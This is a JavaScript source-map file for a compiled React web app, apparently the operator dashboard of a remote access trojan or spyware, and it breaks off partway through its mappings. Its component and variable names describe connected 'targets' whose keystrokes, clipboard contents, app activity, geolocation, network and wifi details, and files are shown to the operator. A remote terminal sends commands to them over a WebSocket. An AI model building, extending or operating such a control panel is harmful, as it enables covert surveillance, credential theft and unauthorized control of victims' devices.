{"version":3,"sources":["colors.ts","components/Divider.tsx","components/Clock.tsx","components/Text.tsx","App.styles.tsx","components/Tile.tsx","components/Table.tsx","components/DotIndicator.tsx","ui/general/NetworkStatus.tsx","ui/target/DeviceView.tsx","components/IconButton.tsx","ui/target/LocationView.tsx","ui/target/NetworkView.tsx","ui/target/WifiView.tsx","ui/target/ExplorerView.tsx","ui/general/TargetListView.tsx","ui/general/Terminal.tsx","ui/target/LoggerView.tsx","services/encoding.ts","ui/target/FileExplorer.tsx","App.tsx","serviceWorker.ts","index.tsx"],"names":["border","a","accent","concat","Divider","bg","verticalBar","react_default","createElement","style","width","height","background","display","alignItems","flexGrow","Component","dot","space","size","css","_templateObject2","_templateObject","Clock","_this","this","setInterval","forceUpdate","now","Date","h","getHours","m","getMinutes","s","getSeconds","length","react","components_Divider","className","Text","_this$props","props","color","weight","font","type","block","other","Object","objectWithoutProperties","c","Text_templateObject","assign","defaultProps","grid","App_styles_templateObject","top","App_styles_templateObject2","main","_templateObject3","left","_templateObject4","right","_templateObject5","bottom","_templateObject6","styles","root","Tile_templateObject","content","Tile_templateObject2","toolbar","Tile_templateObject3","titleGroup","Tile_templateObject4","Tile","state","collapsed","toggle","console","log","setState","title","children","rawContent","divider","actions","collapsible","leading","components_Text","onClick","cursor","Table","data","flipped","justifyContent","keys","map","key","flexDirection","padding","userSelect","DotIndicator","value","activeColor","inactiveColor","DotIndicator_templateObject","NetworkStatus","online","targetConnected","components_Tile","components_Table","STATE","components_DotIndicator","TARGET","DeviceView","target","CPU","hardware","cpu","IconButton","styled","IconButton_templateObject","LocationView","openMap","_ref","location","latitude","longitude","window","open","components_IconButton","COUNTRY","country","CITY","city","LATITUDE","LONGITUDE","ACCURACY","accuracy","NetworkView","IP","net","publicIP","PRIVATE IP","privateIP","HOSTNAME","host","WifiView","wifi","name","defineProperty","reduce","b","objectSpread","ExplorerView","main_default","fontFamily","displayDataTypes","src","indentWidth","collapseStringsAfterLength","theme","targetListItem","TargetListView_templateObject","contextMenu","TargetListView_templateObject2","menuItem","TargetListView_templateObject3","menuItemIcon","TargetListView_templateObject4","TargetListItem","items","icon","TriggerContextMenu","_ref2","onMenu","id","es6","item","i","attributes","TargetListView","targets","onSelect","v","TargetListView_TargetListItem","TargetListView_TriggerContextMenu","_onMenu","_x","apply","arguments","toString","action","Terminal_templateObject","input","Terminal_templateObject2","TerminalState","history","historyIndex","Terminal","saveHistory","localStorage","setItem","JSON","stringify","onChange","e","handleArrow","isUp","_this$state","inputRef","current","scrollIntoView","onKeyDown","ev","onEnter","newHistory","toConsumableArray","preventDefault","focus","local","getItem","parse","stdout","line","error","ref","autoCapitalize","autoCorrect","spellCheck","LoggerView","endOfLog","React","createRef","onClear","borderRight","overflow","l","base64ToBytes","base64","binaryStr","atob","bytes","Uint8Array","charCodeAt","file","FileExplorer_templateObject","fileIcon","FileExplorer_templateObject2","FileExplorer","showDrives","onBack","directory","parts","path","split","onNavigate","slice","join","onChangeDrive","_this2","fileView","files","f","driveView","drives","gridArea","marginRight","fontSize","margin","AppState","img","App","classCallCheck","possibleConstructorReturn","getPrototypeOf","call","websocket","terminalInput","onOpen","send","onClose","onMessage","payload","indexOf","undefined","keylog","applog","clipboardLog","directoryInfo","obj","sendToTarget","to","selectTarget","executeCommand","rest","msg","clear","handleContextMenu","replace","navigateDirectory","hostname","url","WebSocket","initConnection","addEventListener","ctrlKey","shiftKey","removeEventListener","target_DeviceView","target_NetworkView","target_LocationView","target_WifiView","target_ExplorerView","target_LoggerView","target_FileExplorer","general_Terminal","components_Clock","general_NetworkStatus","general_TargetListView","alt","Boolean","match","ReactDOM","render","src_App","document","getElementById","navigator","serviceWorker","ready","then","registration","unregister"],"mappings":"uQAAaA,EAAS,UACTC,EACR,IADQA,EAER,IAFQA,EAGR,IAEQC,EAAM,OAAAC,OAAUF,EAAV,MAAAE,OAAkBF,EAAlB,MAAAE,OAA0BF,EAA1B,KCYJG,mLAbX,IAAMC,EAAKL,EACLM,EAAcC,EAAAN,EAAAO,cAAA,OAAKC,MAAO,CAAEC,MAAO,EAAGC,OAAQ,EAAGC,WAAYP,KAEnE,OACEE,EAAAN,EAAAO,cAAA,OAAKC,MAAO,CAAEI,QAAS,OAAQC,WAAY,WACxCR,EACDC,EAAAN,EAAAO,cAAA,OAAKC,MAAO,CAAEM,SAAU,EAAGJ,OAAQ,GAAKC,WAAYP,KACnDC,UATaU,gcCEtB,IACEX,EACAY,EACAC,EACAC,EAQIV,EAAQW,YAAHC,KAXThB,EFEgB,UEDhBY,EAgBuBjB,EAfvBkB,EAe+B,GAd/BC,EAcmC,EAbhCC,YALoBE,IAMcjB,EAAMa,EAAQC,EAE/Bd,EAAMa,EAAQC,EAAmCF,EAClDC,EAAWA,KAyCjBK,8LA5BO,IAAAC,EAAAC,KAClBC,YAAY,WACVF,EAAKG,eACJ,sCAIH,IAAMC,EAAM,IAAIC,KACZC,EAAC,GAAA3B,OAAMyB,EAAIG,YACXC,EAAC,GAAA7B,OAAMyB,EAAIK,cACXC,EAAC,GAAA/B,OAAMyB,EAAIO,cAKf,OAJAL,EAAgB,GAAZA,EAAEM,OAAc,IAAMN,EAAIA,EAC9BE,EAAgB,GAAZA,EAAEI,OAAc,IAAMJ,EAAIA,EAC9BE,EAAgB,GAAZA,EAAEE,OAAc,IAAMF,EAAIA,EAG5B3B,EAAAN,EAAAO,cAAC6B,EAAA,SAAD,KACE9B,EAAAN,EAAAO,cAAC8B,EAAD,MACA/B,EAAAN,EAAAO,cAAA,OAAK+B,UAAW9B,GACdF,EAAAN,EAAAO,cAAA,WACGsB,EADH,IACOE,EADP,IACWE,YArBDlB,qNCTdwB,mLAMK,IAAAC,EACsDhB,KAAKiB,MAA1DC,EADDF,EACCE,MAAOC,EADRH,EACQG,OAAcC,GADtBJ,EACgBK,KADhBL,EACsBI,MAAM1B,EAD5BsB,EAC4BtB,KAAM4B,EADlCN,EACkCM,MAAUC,EAD5CC,OAAAC,EAAA,EAAAD,CAAAR,EAAA,iDAEHU,EAAIjD,EACK,UAATyC,IAAmBQ,EHnBA,WGqBvB,IAAM1C,EAAQW,YAAHgC,IACEL,EAAQ,QAAU,eACpBI,EACMP,EACAC,EACF1B,GAEf,OAAOZ,EAAAN,EAAAO,cAAA,MAAAyC,OAAAI,OAAA,CAAKd,UAAW9B,GAAWuC,WAlBnBhC,aAAbwB,EACGc,aAAe,CACpBX,MAAO,UACPG,KAAM,QAmBKN,sxCCnCR,IAAMe,EAAOnC,YAAHoC,IJIC,UIDPtD,GAWEuD,EAAMrC,YAAHsC,KAQHC,EAAOvC,YAAHwC,IAEK5D,GAKT6D,EAAOzC,YAAH0C,IAIY9D,GAGhB+D,EAAQ3C,YAAH4C,IAIWhE,GAGhBiE,EAAS7C,YAAH8C,kmBC7BnB,IAAMC,EAAS,CACbC,KAAMhD,YAAFiD,KAOJC,QAASlD,YAAFmD,KAGPC,QAASpD,YAAFqD,KAMPC,WAAYtD,YAAFuD,MAMNC,6MAMJC,MAAQ,CACNC,WAAW,KAObC,OAAS,WACPC,QAAQC,IAAIzD,EAAKqD,MAAMC,WACvBtD,EAAK0D,SAAS,CAAEJ,WAAYtD,EAAKqD,MAAMC,gGALvCrD,KAAKyD,SAAS,CAAEJ,UAAWrD,KAAKiB,MAAMoC,6CAQ/B,IAAArC,EAUHhB,KAAKiB,MARPyC,EAFK1C,EAEL0C,MACAC,EAHK3C,EAGL2C,SACAC,EAJK5C,EAIL4C,WACAC,EALK7C,EAKL6C,QACAC,EANK9C,EAML8C,QACAC,EAPK/C,EAOL+C,YACAC,EARKhD,EAQLgD,QACGzC,EATEC,OAAAC,EAAA,EAAAD,CAAAR,EAAA,+EAYCqC,EAAcrD,KAAKoD,MAAnBC,UAER,OACEvE,EAAAN,EAAAO,cAAC6B,EAAA,SAAD,KACGiD,GAAW/E,EAAAN,EAAAO,cAAC8B,EAAD,MACZ/B,EAAAN,EAAAO,cAAA,MAAAyC,OAAAI,OAAA,CAAKd,UAAW4B,EAAOC,MAAUpB,GAC/BzC,EAAAN,EAAAO,cAAA,OAAK+B,UAAW4B,EAAOK,SACrBjE,EAAAN,EAAAO,cAAA,OAAK+B,UAAW4B,EAAOO,YACpBe,GAAWA,EACZlF,EAAAN,EAAAO,cAACkF,EAAD,CACEC,QAASH,EAAc/D,KAAKsD,OAAS,KACrCnC,OAAQ,IACRzB,KAAK,OACLV,MAAO,CAAEmF,OAAQ,YAEhBT,IAGJI,GAAWA,KAEXT,IAAcU,KACdH,EACCD,EAEA7E,EAAAN,EAAAO,cAAA,OAAK+B,UAAW4B,EAAOG,SAAUc,aAvD5BpE,aAAb4D,EACGtB,aAAe,CACpBgC,SAAS,EACTE,aAAa,GA4DFZ,QCxDAiB,mLAvCJ,IAAApD,EACmBhB,KAAKiB,MAAvBoD,EADDrD,EACCqD,KAER,OAHOrD,EACOsD,QAIVxF,EAAAN,EAAAO,cAAA,OAAKC,MAAO,CAAEI,QAAS,OAAQmF,eAAgB,kBAC5C/C,OAAOgD,KAAKH,GAAMI,IAAI,SAAAC,GAAG,OACxB5F,EAAAN,EAAAO,cAAA,OAAK2F,IAAKA,EAAK1F,MAAO,CAAEI,QAAS,OAAQuF,cAAe,WACtD7F,EAAAN,EAAAO,cAACkF,EAAD,CAAM/C,MAAM,SAASC,OAAQ,KAC1BuD,GAEH5F,EAAAN,EAAAO,cAACkF,EAAD,KAAOI,EAAKK,QAOpB5F,EAAAN,EAAAO,cAAA,WACGyC,OAAOgD,KAAKH,GAAMI,IAAI,SAAAC,GAAG,OACxB5F,EAAAN,EAAAO,cAAA,OACE2F,IAAKA,EACL1F,MAAO,CACL4F,QAAS,UACTxF,QAAS,OACTmF,eAAgB,kBAGlBzF,EAAAN,EAAAO,cAACkF,EAAD,CAAM/C,MAAM,SAASC,OAAQ,IAAKnC,MAAO,CAAC6F,WAAY,SACnDH,GAEH5F,EAAAN,EAAAO,cAACkF,EAAD,KAAOI,EAAKK,eAhCJnF,kPCCduF,oLAGK,IAAA9D,EACiDhB,KAAKiB,MAArD8D,EADD/D,EACC+D,MAAOC,EADRhE,EACQgE,YAAaC,EADrBjE,EACqBiE,cAAkB1D,EADvCC,OAAAC,EAAA,EAAAD,CAAAR,EAAA,yCAGDhC,EAAQW,YAAHuF,KADE,IAOGH,EAAQC,EAAcC,GAEtC,OAAOnG,EAAAN,EAAAO,cAAA,MAAAyC,OAAAI,OAAA,CAAKd,UAAW9B,GAAWuC,WAdXhC,aAArBuF,GACGjD,aAAe,0CANtBkD,OAAiB,OACjBC,YAAuB,eACvBC,cAAyB,WAqBZH,UCOAK,oLA3BJ,IAAAnE,EAC2BhB,KAAKiB,MAAhCmE,EADApE,EACAoE,OAAQC,EADRrE,EACQqE,gBAEf,OAAOvG,EAAAN,EAAAO,cAACuG,EAAD,CAAM5B,MAAM,kBACnB5E,EAAAN,EAAAO,cAACwG,EAAD,CACEjB,SAAO,EACPD,KAAM,CACJmB,MACE1G,EAAAN,EAAAO,cAAA,WACED,EAAAN,EAAAO,cAACkF,EAAD,KAAOmB,EAAS,SAAW,WAC3BtG,EAAAN,EAAAO,cAAC0G,GAAD,CAAcV,MAAOK,KAGzBM,OACE5G,EAAAN,EAAAO,cAAA,WACED,EAAAN,EAAAO,cAACkF,EAAD,KACGoB,EAAkB,YAAc,gBAEnCvG,EAAAN,EAAAO,cAAC0G,GAAD,CAAcV,MAAOM,gBAnBL9F,aCeboG,oLAXJ,IACCC,EAAW5F,KAAKiB,MAAhB2E,OAER,OACE9G,EAAAN,EAAAO,cAACuG,EAAD,CAAM5B,MAAM,UACV5E,EAAAN,EAAAO,cAACwG,EAAD,CAAOlB,KAAM,CAAEwB,IAAKD,EAAOE,SAAUC,eANpBxG,odCNzB,IAqBeyG,GArBIC,aAAO,MAAPA,CAAHC,KAeO1H,EAAQA,EAAQA,EAGhBA,EAAQA,EAAQA,GCoBxB2H,8MA7BbC,QAAU,WAAM,IAAAC,EACgBtG,EAAKkB,MAAM2E,OAAOU,SAAzCC,EADOF,EACPE,SAAUC,EADHH,EACGG,UACjBC,OAAOC,KAAP,qCAAAhI,OAAiD6H,EAAjD,KAAA7H,OAA6D8H,EAA7D,YAAkF,kFAE3E,IACCZ,EAAW5F,KAAKiB,MAAhB2E,OAER,OACE9G,EAAAN,EAAAO,cAACuG,EAAD,CAAM5B,MAAM,WAAWI,QACrBhF,EAAAN,EAAAO,cAAA,WACED,EAAAN,EAAAO,cAAC4H,GAAD,CAAYzC,QAASlE,KAAKoG,SACxBtH,EAAAN,EAAAO,cAAA,KAAG+B,UAAU,kBAAb,UAIJhC,EAAAN,EAAAO,cAACwG,EAAD,CACElB,KAAM,CACJuC,QAAShB,EAAOU,SAAUO,QAC1BC,KAAMlB,EAAOU,SAAUS,KACvBC,SAAUpB,EAAOU,SAAUC,SAC3BU,UAAWrB,EAAOU,SAAUE,UAC5BU,SAAUtB,EAAOU,SAAUa,oBAtBZ5H,aCgBZ6H,oLAjBJ,IACCxB,EAAW5F,KAAKiB,MAAhB2E,OAER,OACE9G,EAAAN,EAAAO,cAACuG,EAAD,CAAM5B,MAAM,WACV5E,EAAAN,EAAAO,cAACwG,EAAD,CACElB,KAAM,CACJgD,GAAIzB,EAAO0B,IAAIC,SACfC,aAAc5B,EAAO0B,IAAIG,UACzBC,SAAU9B,EAAO0B,IAAIK,gBAVPpI,sBCiBXqI,oLAhBJ,IACChC,EAAW5F,KAAKiB,MAAhB2E,OACFvB,EAAO7C,OAAOgD,KAAKoB,EAAOiC,MAC7BpD,IAAI,SAAAqD,GAAI,OAAAtG,OAAAuG,GAAA,EAAAvG,CAAA,GACNsG,EAAOlC,EAAOiC,KAAMC,MAEtBE,OAAO,SAACxJ,EAAGyJ,GAAJ,OAAAzG,OAAA0G,EAAA,EAAA1G,CAAA,GAAgBhD,EAAMyJ,IAAM,IAEtC,OACEnJ,EAAAN,EAAAO,cAACuG,EAAD,CAAM5B,MAAM,kBACV5E,EAAAN,EAAAO,cAACwG,EAAD,CAAOlB,KAAMA,YAXE9E,iCCeR4I,oLAjBJ,IACCvC,EAAW5F,KAAKiB,MAAhB2E,OACR,OACE9G,EAAAN,EAAAO,cAACuG,EAAD,CAAM5B,MAAM,YACV5E,EAAAN,EAAAO,cAACqJ,GAAA5J,EAAD,CACEQ,MAAO,CAAEG,WAAY,cAAekJ,WAAY,WAChDC,kBAAkB,EAClBC,IAAK3C,EACL4C,YAAa,EACbC,2BAA4B,GAC5BC,MAAM,sBAXWnJ,uoCCK3B,IAAMoJ,GAAiBhJ,YAAHiJ,KAWGpK,EAAQA,EAAQA,EAGhBA,EAAQA,EAAQA,GAIjCkE,GAAS,CACbmG,YAAalJ,YAAFmJ,MAOXC,SAAUpJ,YAAFqJ,MAgBRC,aAActJ,YAAFuJ,OAKRC,GAAiB,SAAA9C,GAAA,IACrBT,EADqBS,EACrBT,OACAb,EAFqBsB,EAErBtB,MACGxD,EAHkBC,OAAAC,EAAA,EAAAD,CAAA6E,EAAA,2BASrBvH,EAAAN,EAAAO,cAAA,MAAAyC,OAAAI,OAAA,CACEd,UAAW6H,GACX3J,MAAO,CAAEI,QAAS,OAAQC,WAAY,WAClCkC,GAEJzC,EAAAN,EAAAO,cAAC0G,GAAD,CACEV,MAAOa,GAAUb,IAAUa,EAAQlB,IACnCM,YAAavG,EACbwG,cAAc,0BAEhBnG,EAAAN,EAAAO,cAACkF,EAAD,KAAOc,KAILqE,GAAQ,CACZ,CAAEC,KAAM,aAAcvB,KAAM,cAC5B,CAAEuB,KAAM,SAAUvB,KAAM,mBACxB,CAAEuB,KAAM,UAAWvB,KAAM,gBASrBwB,GAAqB,SAAAC,GAAA,IACzBC,EADyBD,EACzBC,OACAC,EAFyBF,EAEzBE,GACGxI,EAHsBO,OAAAC,EAAA,EAAAD,CAAA+H,EAAA,wBAKzBzK,EAAAN,EAAAO,cAAC2K,GAAA,EAADlI,OAAAI,OAAA,CAAa6H,GAAIA,EAAI3I,UAAW4B,GAAOmG,aAAiB5H,GACrDmI,GAAM3E,IAAI,SAACkF,EAAMC,GAAP,OACT9K,EAAAN,EAAAO,cAAC2K,GAAA,EAAD,CACEhF,IAAKkF,EACL1F,QAAS,kBAAMsF,EAAOG,EAAK7B,OAC3B+B,WAAY,CAAE/I,UAAW4B,GAAOqG,WAEhCjK,EAAAN,EAAAO,cAAA,KAAG+B,UAAS,kBAAApC,OAAoBgE,GAAOuG,eAAiBU,EAAKN,MAC7DvK,EAAAN,EAAAO,cAACkF,EAAD,CAAMvE,KAAK,QAAQiK,EAAK7B,WAuCjBgC,oLAzBJ,IAAA9I,EACuChB,KAAKiB,MAA3C8I,EADD/I,EACC+I,QAASnE,EADV5E,EACU4E,OAAQoE,EADlBhJ,EACkBgJ,SAAUR,EAD5BxI,EAC4BwI,OAEnC,OACE1K,EAAAN,EAAAO,cAACuG,EAAD,CAAM5B,MAAM,WACTqG,EAAQtF,IAAI,SAACwF,EAAGL,GAAJ,OACX9K,EAAAN,EAAAO,cAAC6B,EAAA,SAAD,CAAU8D,IAAKkF,GACb9K,EAAAN,EAAAO,cAAC2K,GAAA,EAAD,CAAoBD,GAAE,QAAA/K,OAAUkL,IAC9B9K,EAAAN,EAAAO,cAACmL,GAAD,CACEtE,OAAQA,EACRb,MAAOkF,EACP/F,QAAS,kBAAM8F,EAASC,OAG5BnL,EAAAN,EAAAO,cAACoL,GAAD,CACEX,OAAM,SAAAY,GAAA,SAAAZ,EAAAa,GAAA,OAAAD,EAAAE,MAAAtK,KAAAuK,WAAA,OAAAf,EAAAgB,SAAA,kBAAAJ,EAAAI,YAAAhB,EAAA,CAAE,SAAAiB,GAAM,OAAIjB,EAAOS,EAAGQ,KAC5BhB,GAAE,QAAA/K,OAAUkL,gBAjBGrK,uhBCjH7B,IAAMoD,GAAOhD,YAAH+K,MAYJC,GAAQhL,YAAHiL,MAgBLC,yCACJ9F,MAAgB,QAChB+F,QAAoB,QACpBC,cAAwB,GAkGXC,8MA9Fb5H,MAAQ,IAAIyH,KAWZI,YAAc,SAACH,GACbI,aAAaC,QAAQ,iBAAkBC,KAAKC,UAAUP,OAGxDQ,SAAW,SAACC,GACVxL,EAAK0D,SAAS,CAAEsB,MAAOwG,EAAE3F,OAAOb,MAAOgG,cAAe,OAGxDS,YAAc,SAACC,GAAkB,IAAAC,EACC3L,EAAKqD,MAA/B0H,EADyBY,EACzBZ,QAASC,EADgBW,EAChBX,aACfA,GAAgBU,EAAO,GAAK,EAC5B,IAAM7B,EAAIkB,EAAQnK,OAAS,EAAIoK,EAC3BnB,KAAKkB,GACP/K,EAAK0D,SACH,CACEsB,MAAO+F,EAAQlB,GACfmB,gBAEF,WACEhL,EAAKkB,MAAM0K,SAASC,QAASC,gBAAe,QAMpDC,UAAY,SAACC,GAAwC,IAC3ChH,EAAUhF,EAAKqD,MAAf2B,MACR,GAAe,UAAXgH,EAAGrH,KAAmBK,EAAMpE,OAAS,EAAG,CAC1CZ,EAAKkB,MAAM+K,QAAQjH,GADuB,IAElC+F,EAAY/K,EAAKqD,MAAjB0H,QACFmB,EAAU,GAAAvN,OAAA8C,OAAA0K,EAAA,EAAA1K,CAAOsJ,GAAP,CAAgB/F,IAChChF,EAAK0D,SAAS,CAAEsB,MAAO,GAAI+F,QAASmB,IACpClM,EAAKkL,YAAYgB,OACG,YAAXF,EAAGrH,KACZqH,EAAGI,iBACHpM,EAAKyL,aAAY,IACG,cAAXO,EAAGrH,MACZqH,EAAGI,iBACHpM,EAAKyL,aAAY,OAIrBtH,QAAU,SAACqH,GACW,aAAhBA,EAAE3F,OAAO6D,IAAmB1J,EAAKkB,MAAM0K,SAASC,QAASQ,4FAnD7D,IAAMC,EAAQnB,aAAaoB,QAAQ,kBAC/BD,GACFrM,KAAKyD,SAAS,CACZqH,QAASM,KAAKmB,MAAMF,sCAmDjB,IAAArL,EACsBhB,KAAKiB,MAA1B0K,EADD3K,EACC2K,SAAUa,EADXxL,EACWwL,OACVzH,EAAU/E,KAAKoD,MAAf2B,MAER,OACEjG,EAAAN,EAAAO,cAAA,OAAK0K,GAAG,WAAWvF,QAASlE,KAAKkE,QAASpD,UAAW6B,IACnD7D,EAAAN,EAAAO,cAAA,YACGyN,EAAO/H,IAAI,SAACgI,EAAM7C,GAAP,OACV9K,EAAAN,EAAAO,cAACkF,EAAD,CACE3C,OAAK,EACLoD,IAAKkF,EACLzI,OAAQ,IACRD,MAAM,SACNlC,MAAOyN,EAAKC,MAAQ,CAAExL,MAAO,WAAc,IAE1CuL,EAAK1H,SAGVjG,EAAAN,EAAAO,cAAA,OAAKC,MAAO,CAAEI,QAAS,OAAQH,MAAO,SACpCH,EAAAN,EAAAO,cAACkF,EAAD,CAAM9C,OAAQ,KAAd,MACArC,EAAAN,EAAAO,cAAA,SACE4N,IAAKhB,EACL7K,UAAW6J,GACX5F,MAAOA,EACPuG,SAAUtL,KAAKsL,SACfQ,UAAW9L,KAAK8L,UAChBc,eAAe,QACfC,YAAY,QACZC,YAAY,cAtFHvN,aCaRwN,8MAxCbC,SAAWC,IAAMC,gGAGflN,KAAKgN,SAASpB,QAASC,gBAAe,oCAG/B,IAAA7K,EACgChB,KAAKiB,MAApCuC,EADDxC,EACCwC,IAAKxE,EADNgC,EACMhC,MAAO0E,EADb1C,EACa0C,MAAOyJ,EADpBnM,EACoBmM,QAE3B,OACErO,EAAAN,EAAAO,cAACuG,EAAD,CACEzB,SAAS,EACTD,YAAY,EACZF,MAAOA,EACP1E,MAAKwC,OAAA0G,EAAA,EAAA1G,CAAA,CACH4L,YAAW,aAAA1O,OAAeH,GAC1B8O,SAAU,OACVnM,MjBvBiB,UiBwBjB0D,QAAS,WACN5F,GAEL8E,QACEhF,EAAAN,EAAAO,cAAC6B,EAAA,SAAD,KACE9B,EAAAN,EAAAO,cAAC4H,GAAD,CAAYzC,QAASiJ,GACnBrO,EAAAN,EAAAO,cAAA,KAAG+B,UAAU,kBAAb,YAKL0C,EAAIiB,IAAI,SAAC6I,EAAG1D,GAAJ,OACP9K,EAAAN,EAAAO,cAACkF,EAAD,CAAM/C,MAAM,SAASwD,IAAKkF,EAAGtI,OAAK,GAC/BgM,KAGLxO,EAAAN,EAAAO,cAAA,OAAK4N,IAAK3M,KAAKgN,mBAxCEzN,aCKZgO,GAAgB,SAACC,GAG5B,IAFA,IAAMC,EAAYC,KAAKF,GACjBG,EAAQ,IAAIC,WAAWH,EAAU9M,QAC9BiJ,EAAI,EAAGA,EAAI6D,EAAU9M,OAAQiJ,IACpC+D,EAAM/D,GAAK6D,EAAUI,WAAWjE,GAElC,OAAO+D,4dCXT,IAAMjL,GAAS,CACboL,KAAMnO,YAAFoO,MAaJC,SAAUrO,YAAFsO,OA+EKC,8MAlEb9K,MAAQ,CACN+K,YAAY,KAGdC,OAAS,WACP,GAAkC,SAA9BrO,EAAKkB,MAAMoN,UAAUhN,KAAiB,CACxC,IAAMiN,EAAQvO,EAAKkB,MAAMoN,UAAUE,KAAKC,MAAM,OAC9CzO,EAAKkB,MAAMwN,WAAWH,EAAMI,MAAM,EAAGJ,EAAM3N,OAAS,GAAGgO,KAAK,YAE5D5O,EAAK0D,SAAS,CAAE0K,YAAY,OAIhCS,cAAgB,SAACL,GACfxO,EAAK0D,SAAS,CAAE0K,YAAY,IAC5BpO,EAAKkB,MAAMwN,WAAWF,4EAGf,IAAAM,EAAA7O,KAAAgB,EAC2BhB,KAAKiB,MAA/BoN,EADDrN,EACCqN,UAAWI,EADZzN,EACYyN,WAEbK,EAAWT,EAAUU,MAAMtK,IAAI,SAACuK,EAAGpF,GAAJ,OACnC9K,EAAAN,EAAAO,cAAA,OACE+B,UAAW4B,GAAOoL,KAClBpJ,IAAKkF,EACL1F,QAAS,kBAAMuK,EAAWJ,EAAUE,KAAO,KAAOS,EAAElH,QAEpDhJ,EAAAN,EAAAO,cAAA,KAAG+B,UAAS,kBAAApC,OAAoBgE,GAAOsL,WACzB,SAAXgB,EAAE3N,KAAkB,oBAAsB,UAE7CvC,EAAAN,EAAAO,cAACkF,EAAD,CAAM/C,MAAM,UAAU8N,EAAElH,SAItBmH,EAAYZ,EAAUa,OAAOzK,IAAI,SAAC8J,EAAM3E,GAAP,OACrC9K,EAAAN,EAAAO,cAAA,OAAK+B,UAAW4B,GAAOoL,KAAMpJ,IAAKkF,EAAG1F,QAAS,kBAAM2K,EAAKD,cAAcL,KACrEzP,EAAAN,EAAAO,cAAA,KAAG+B,UAAS,kBAAApC,OAAoBgE,GAAOsL,WAAvC,WACAlP,EAAAN,EAAAO,cAACkF,EAAD,CAAM/C,MAAM,SAASlC,MAAO,CAAE6F,WAAY,SACvC0J,EAAKC,MAAM,KAAK,OAKjB3L,EAAU7C,KAAKoD,MAAM+K,WAAac,EAAYH,EAEpD,OACEhQ,EAAAN,EAAAO,cAACuG,EAAD,CACEvB,aAAa,EACbF,SAAS,EACTD,YAAY,EACZF,MAAO2K,EAAUE,KACjBvP,MAAO,CAAEmQ,SAAU,QAAS9B,SAAU,QACtCrJ,QACElF,EAAAN,EAAAO,cAAC4H,GAAD,CAAYzC,QAASlE,KAAKoO,OAAQpP,MAAO,CAAEoQ,YAAa,KACtDtQ,EAAAN,EAAAO,cAAA,KAAG+B,UAAU,iBAAiB9B,MAAO,CAAEqQ,SAAU,KAAjD,gBAMJvQ,EAAAN,EAAAO,cAAA,OAAKC,MAAO,CAAEsQ,OAAQ,QAAUzM,WA7DbtD,aCJrBgQ,yCACJnK,QAAkB,OAClBQ,mBACAmE,QAAoB,QACpByC,OAAuB,QACvBgD,IAAc,IAGVC,eAQJ,SAAAA,EAAYxO,GAAY,IAAAlB,EAAAyB,OAAAkO,EAAA,EAAAlO,CAAAxB,KAAAyP,IACtB1P,EAAAyB,OAAAmO,EAAA,EAAAnO,CAAAxB,KAAAwB,OAAAoO,EAAA,EAAApO,CAAAiO,GAAAI,KAAA7P,KAAMiB,KANA6O,eAKgB,EAAA/P,EAJhBgQ,cAAgB9C,IAAMC,YAINnN,EAFxBqD,MAAQ,IAAImM,GAEYxP,EAwBxBiQ,OAAS,WACPjQ,EAAK0D,SAAS,CAAE2B,QAAQ,IACxBrF,EAAKkQ,KAAK,CAAE5O,KAAM,oBA1BItB,EA6BxBmQ,QAAU,WACRnQ,EAAK0D,SAAS,IAAI8L,KA9BIxP,EAiCxBoQ,UAAY,SAACpE,GACX,IAAM1H,EAAO+G,KAAKmB,MAAMR,EAAG1H,MACnBhD,EAAkBgD,EAAlBhD,KAAM+O,EAAY/L,EAAZ+L,QAEd,GADA7M,QAAQC,IAAIa,GACC,SAAThD,EAAiB,KACX0I,EAAmCqG,EAAnCrG,QACRhK,EAAK0D,SAAS,CAAEsG,YAFG,IAGXnE,EAAW7F,EAAKqD,MAAhBwC,OACJA,IAA2C,IAAjCmE,EAAQsG,QAAQzK,EAAOlB,MACnC3E,EAAK0D,SAAS,CAAEmC,YAAQ0K,SACrB,GAAa,qBAATjP,EACTtB,EAAK0D,SAAS,CACZmC,OAAOpE,OAAA0G,EAAA,EAAA1G,CAAA,GAAK4O,EAAN,CAAe1L,IAAKL,EAAKK,aAE5B,GAAa,WAATrD,EAAmB,KACpBqL,EAAkB0D,EAAlB1D,MAAOF,EAAW4D,EAAX5D,OACfzM,EAAK0D,SACH,CACE+I,OAAM,GAAA9N,OAAA8C,OAAA0K,EAAA,EAAA1K,CACDzB,EAAKqD,MAAMoJ,QADVhL,OAAA0K,EAAA,EAAA1K,CAEDgL,EAAOgC,MAAM,MAAM/J,IAAI,SAACM,GAAD,MAAoB,CAAE2H,QAAO3H,cAG3D,WACEhF,EAAKgQ,cAAcnE,QAASC,wBAG3B,GAAY,OAARxK,EAAe,CACxBkC,QAAQC,IAAI4M,GADY,IAElBxK,EAAW7F,EAAKqD,MAAhBwC,OACN,GAAIA,EAAQ,CACV,IAAM2K,EAAmB,WAAY3K,EAASA,EAAO2K,OAAS,GAC9D3K,EAAO2K,OAAP,GAAA7R,OAAA8C,OAAA0K,EAAA,EAAA1K,CAAoB+O,GAApB/O,OAAA0K,EAAA,EAAA1K,CAA+B4O,EAAQG,SACvC,IAAMC,EAAmB,WAAY5K,EAASA,EAAO4K,OAAS,GAC9D5K,EAAO4K,OAAP,GAAA9R,OAAA8C,OAAA0K,EAAA,EAAA1K,CAAoBgP,GAApBhP,OAAA0K,EAAA,EAAA1K,CAA+B4O,EAAQI,SACvC,IAAMC,EACJ,iBAAkB7K,EAASA,EAAO6K,aAAe,GACnD7K,EAAO6K,aAAP,GAAA/R,OAAA8C,OAAA0K,EAAA,EAAA1K,CAA0BiP,GAA1BjP,OAAA0K,EAAA,EAAA1K,CAA2C4O,EAAQK,eACnD1Q,EAAK0D,SAAS,CACZmC,OAAQA,UAGP,GAAY,cAARvE,EAAsB,CAC/BtB,EAAK0D,SAAS,CAAC+L,IAAKY,IACN7C,GAAc6C,QAKvB,GAAY,iBAAR/O,EAAyB,KAC1BuE,EAAW7F,EAAKqD,MAAhBwC,OACJA,GAAUwK,GACZrQ,EAAK0D,SAAS,CAAEmC,OAAOpE,OAAA0G,EAAA,EAAA1G,CAAA,GAAKoE,EAAN,CAAc8K,cAAeN,WAGrD7M,QAAQC,IAAIa,IAxFQtE,EA4FxBkQ,KAAO,SAACU,GACNpN,QAAQC,IAAImN,GACZ5Q,EAAK+P,UAAUG,KAAK7E,KAAKC,UAAUsF,KA9Fb5Q,EAiGxB6Q,aAAe,SAACnG,EAAgB7E,GAG9B,OAFKA,GAAU7F,EAAKqD,MAAMwC,SAAQA,EAAS7F,EAAKqD,MAAMwC,OAAQlB,KAEvD3E,EAAKkQ,KAALzO,OAAA0G,EAAA,E